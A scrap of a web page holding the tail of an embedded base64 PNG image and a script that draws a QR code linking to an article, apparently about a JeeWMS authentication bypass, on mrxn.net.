6In6hHl/Q9eSfGkgKLnzvDSw/GPZtZtNTy3SDvZr4zMVXkZzonq6bD5uT7WkcVpNTFyQXqIejV0QLZlr0oOYerbNfMPNFD9IzyFpcb8jsxt6oLQPJpGaYnc1p9lyt754ep1a/uR7HI8zJvSa63jNsffeqV97zVF1/zrEHPbWur5eB9MQVv+cGll+dOD356Dg+AXpmNXrMGVsz42e8z/Sb7XWm/ozH3me83dM/3uSvN8Qb/SV8DeRwED+ffPhtr69V2ONlHRjnVQuMw8kHWe8h+WAvX/X4ArWs96AnZ6rY81fd2rB61hX2rJreztXj2nq51lxviLf0S3j5ou60nuH+MdRJm7OfOfWwuc7JdejZ05PvOeOjvfWkfg96zrA9Zl7P0bl6rzek3sYvWC8D6VM7is+c2yfFPsaVzfV+6pW7x/jIY07vjD3PLKdmH73G5isf5aqvru0bXgZSDdf6fTewGUimtIevOKZPULj3ixa4f81HD9T0zFhP5+rtufTu0GOdefXKejrPPFXL2r7hzUBiuPC+G7gG8r67n+78JQPJqxbMdvAVNmdc2ZycXsHME/0san3Wta7vZXyG0yuY9Tuq15/aYOb9koHMGl/aazfwbQPxaeh8dMw8NRVHXnPP+KvXc8366DPXvT3WV/mMp/pdf9tA3ODi525gMxAnO+PnWs/dR31nOTWfWtnu5sNq3aM+4+5Nn45eZ03lXmOu1qrprTnXm4GYuPg9N7AMxOmd4TNHtU/3qof3curxCDV5ps+0+GdPpN6eU6+cHhXWVK75rGuur5OvqHstA6mGa/2+G7gG8r67n+78PwAAAP//pfL9uQAAAAZJREFUAwDuaWCetY54LgAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/JeeWMS-AuthInterceptor-authbypass.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 